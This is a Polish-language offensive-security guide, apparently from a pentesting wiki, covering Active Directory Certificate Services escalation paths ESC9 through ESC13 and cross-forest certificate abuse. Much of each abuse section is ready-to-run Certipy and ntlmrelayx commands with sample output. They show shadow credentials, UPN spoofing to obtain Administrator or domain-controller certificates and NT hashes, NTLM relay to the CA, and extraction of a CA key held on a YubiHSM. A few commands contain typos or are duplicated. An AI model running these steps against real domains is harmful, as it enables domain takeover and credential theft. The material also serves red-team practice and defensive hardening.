Nowa wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, oznaczana jako ESC9, zapobiega osadzaniu **nowego rozszerzenia zabezpieczeń `szOID_NTDS_CA_SECURITY_EXT`** w certyfikacie. Ta flaga staje się istotna, gdy `StrongCertificateBindingEnforcement` jest ustawione na `1` (domyślne ustawienie), w przeciwieństwie do ustawienia `2`. Jej znaczenie wzrasta w scenariuszach, gdzie słabsze odwzorowanie certyfikatu dla Kerberos lub Schannel może być wykorzystane (jak w ESC10), ponieważ brak ESC9 nie zmieniłby wymagań.

Warunki, w których ustawienie tej flagi staje się istotne, obejmują:

* `StrongCertificateBindingEnforcement` nie jest dostosowane do `2` (gdzie domyślnie jest to `1`), lub `CertificateMappingMethods` zawiera flagę `UPN`.
* Certyfikat jest oznaczony flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.
* Certyfikat określa dowolne EKU uwierzytelniania klienta.
* Dostępne są uprawnienia `GenericWrite` do kompromitacji innego konta.

### Scenariusz nadużycia

Załóżmy, że `John@corp.local` posiada uprawnienia `GenericWrite` nad `Jane@corp.local`, z celem skompromitowania `Administrator@corp.local`. Szablon certyfikatu `ESC9`, do którego `Jane@corp.local` ma prawo zapisu, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.

Początkowo, skrót `Jane` jest pozyskiwany za pomocą Cieniowych Poświadczeń, dzięki uprawnieniom `GenericWrite` `Johna`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Następnie `userPrincipalName` użytkownika `Jane` zostaje zmodyfikowany na `Administrator`, celowo pomijając część domeny `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ta modyfikacja nie narusza ograniczeń, pod warunkiem, że `Administrator@corp.local` pozostaje odrębny jako `userPrincipalName` `Administratora`.

W związku z tym szablon certyfikatu `ESC9`, oznaczony jako podatny, jest żądany jako `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zauważono, że atrybut `userPrincipalName` certyfikatu odzwierciedla `Administrator`, pozbawiony jakiegokolwiek „object SID”.

Następnie `userPrincipalName` `Jane` zostaje przywrócone do jej pierwotnego, czyli `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Próba uwierzytelnienia za pomocą wydanego certyfikatu teraz zwraca wartość skrótu NT `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>`, ze względu na brak specyfikacji domeny w certyfikacie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Słabe odwzorowania certyfikatów - ESC10

### Wyjaśnienie

Dwa wartości klucza rejestru na kontrolerze domeny są odnoszone przez ESC10:

* Wartość domyślna dla `CertificateMappingMethods` pod `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` to `0x18` (`0x8 | 0x10`), wcześniej ustawiona na `0x1F`.
* Domyślne ustawienie dla `StrongCertificateBindingEnforcement` pod `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` to `1`, wcześniej `0`.

**Przypadek 1**

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`.

**Przypadek 2**

Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).

### Przypadek nadużycia 1

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do skompromitowania dowolnego konta B.

Na przykład, mając uprawnienia `GenericWrite` nad `Jane@corp.local`, atakujący ma na celu skompromitowanie `Administrator@corp.local`. Procedura jest podobna do ESC9, pozwalając na wykorzystanie dowolnego szablonu certyfikatu.

Początkowo, skrót `Jane` jest pozyskiwany za pomocą Cieniowych Poświadczeń, wykorzystując `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Następnie `userPrincipalName` `Jane` zostaje zmienione na `Administrator`, celowo pomijając część `@corp.local`, aby uniknąć naruszenia ograniczeń.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Następnie żądany jest certyfikat umożliwiający uwierzytelnianie klienta jako `Jane`, korzystając z domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` jest następnie przywrócone do pierwotnego `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autoryzacja za pomocą uzyskanego certyfikatu ujawni wartość skrótu NT dla `Administrator@corp.local`, co wymaga określenia domeny w poleceniu z powodu braku szczegółów domeny w certyfikacie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Przypadek nadużycia 2

Dzięki `CertificateMappingMethods` zawierającemu flagę `UPN` (`0x4`), konto A posiadające uprawnienia `GenericWrite` może skompromitować dowolne konto B, które nie ma właściwości `userPrincipalName`, w tym konta maszynowe i wbudowanego administratora domeny `Administrator`.

Celem jest skompromitowanie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` poprzez Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` `Jane` jest następnie ustawione na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Wniosek o certyfikat do uwierzytelniania klienta jest składany jako `Jane` przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` jest przywracane do swojej pierwotnej postaci po tym procesie.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Aby uwierzytelnić się za pomocą Schannel, wykorzystywana jest opcja `-ldap-shell` z programu Certipy, co wskazuje na sukces uwierzytelnienia jako `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Za pomocą powłoki LDAP polecenia takie jak `set_rbcd` umożliwiają ataki oparte na zleceniach zasobów (RBCD), potencjalnie kompromitując kontroler domeny.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ta podatność dotyczy również każdego konta użytkownika, które nie ma `userPrincipalName` lub w którym nie pasuje on do `sAMAccountName`, przy czym domyślny `Administrator@corp.local` jest głównym celem ze względu na swoje podwyższone uprawnienia LDAP i brak domyślnego `userPrincipalName`.

## Przekazywanie NTLM do ICPR - ESC11

### Wyjaśnienie

Jeśli serwer CA nie jest skonfigurowany z `IF_ENFORCEENCRYPTICERTREQUEST`, ataki przekazywania NTLM mogą być wykonywane bez podpisywania za pośrednictwem usługi RPC. [Odniesienie tutaj](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Możesz użyć `certipy`, aby sprawdzić, czy `Wymuś Szyfrowanie dla Żądań` jest wyłączone, a `certipy` pokaże podatności `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Schemat nadużycia

Należy skonfigurować serwer przekazywania:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Wskazówka: Dla kontrolerów domeny musimy określić `-template` w DomainController.

Lub używając [forka impacket autorstwa sploutchy'ego](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Dostęp do powłoki ADCS CA z YubiHSM - ESC12

### Wyjaśnienie

Administratorzy mogą skonfigurować Certyfikat Uprawnień w celu przechowywania go na zewnętrznym urządzeniu, takim jak "Yubico YubiHSM2".

Jeśli urządzenie USB jest podłączone do serwera CA za pośrednictwem portu USB, lub serwer urządzeń USB w przypadku, gdy serwer CA jest maszyną wirtualną, wymagany jest klucz uwierzytelniający (czasami nazywany "hasłem") dla dostawcy przechowywania kluczy w celu generowania i wykorzystywania kluczy w YubiHSM.

To hasło/klucz jest przechowywane w rejestrze pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` w postaci zwykłego tekstu.

Odniesienie [tutaj](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenariusz nadużycia

Jeśli prywatny klucz CA jest przechowywany na fizycznym urządzeniu USB, gdy uzyskasz dostęp do powłoki, istnieje możliwość odzyskania klucza.

Po pierwsze, musisz uzyskać certyfikat CA (jest to publiczne) a następnie:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
## Nadużycie łącza grup OID - ESC13

### Wyjaśnienie

Atrybut `msPKI-Certificate-Policy` pozwala na dodanie polityki wydawania do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid`, które są odpowiedzialne za wydawanie polityk, można odkryć w Kontekście Nazw Konfiguracji (CN=OID,CN=Public Key Services,CN=Services) kontenera OID PKI. Polityka może być powiązana z grupą AD za pomocą atrybutu `msDS-OIDToGroupLink` tego obiektu, umożliwiając systemowi autoryzację użytkownika, który przedstawia certyfikat, jak gdyby był członkiem grupy. [Odniesienie tutaj](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Innymi słowy, gdy użytkownik ma uprawnienie do zapisania certyfikatu i certyfikat jest powiązany z grupą OID, użytkownik może odziedziczyć uprawnienia tej grupy.

Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), aby znaleźć OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenariusz nadużycia

Znajdź uprawnienie użytkownika, które może użyć `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeśli `John` ma uprawnienie do zapisywania w `VulnerableTemplate`, użytkownik może odziedziczyć uprawnienia grupy `VulnerableGroup`.

Wszystko, co musi zrobić, to określić szablon, a otrzyma certyfikat z uprawnieniami OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kompromitowanie Lasów za pomocą Certyfikatów Wyjaśnione w stronie biernej

### Łamanie Zaufania Lasów przez Skompromitowane CA

Konfiguracja **enrollmentu między lasami** jest stosunkowo prosta. **Certyfikat root CA** z lasu zasobów jest **opublikowany w lasach kont** przez administratorów, a certyfikaty **enterprise CA** z lasu zasobów są **dodane do kontenerów `NTAuthCertificates` i AIA w każdym z lasów kont**. Dla jasności, ta konfiguracja nadaje **CA w lesie zasobów pełną kontrolę** nad wszystkimi innymi lasami, którymi zarządza PKI. Jeśli ten CA zostanie **skompromitowany przez atakujących**, certyfikaty dla wszystkich użytkowników zarówno z lasu zasobów, jak i z lasów kont mogą być **podrabiane przez nich**, co prowadzi do złamania granicy bezpieczeństwa lasu.

### Przyznawanie Uprawnień do Enrollmentu Obcym Podmiotom

W środowiskach wielolasowych należy ostrożnie podchodzić do Enterprise CA, które **publikują szablony certyfikatów**, które pozwalają **Użytkownikom uwierzytelnionym lub obcym podmiotom** (użytkownikom/grupom spoza lasu, do którego należy Enterprise CA) na **prawa do enrollmentu i edycji**.\
Podczas uwierzytelniania przez zaufanie, SID **Użytkowników uwierzytelnionych** jest dodawany do tokena użytkownika przez AD. Dlatego jeśli domena posiada Enterprise CA z szablonem, który **pozwala Użytkownikom uwierzytelnionym na prawa do enrollmentu**, szablon mógłby potencjalnie być **zainstalowany przez użytkownika z innego lasu**. Podobnie, jeśli **prawa do enrollmentu są wyraźnie przyznane obcemu podmiotowi przez szablon**, w ten sposób **tworzony jest związek kontroli dostępu między lasami**, umożliwiający podmiotowi z jednego lasu **zainstalowanie szablonu z innego lasu**.

Oba scenariusze prowadzą do **zwiększenia powierzchni ataku** z jednego lasu do drugiego. Ustawienia szablonu certyfikatu mogą być wykorzystane przez atakującego do uzyskania dodatkowych uprawnień w obcej domenie.
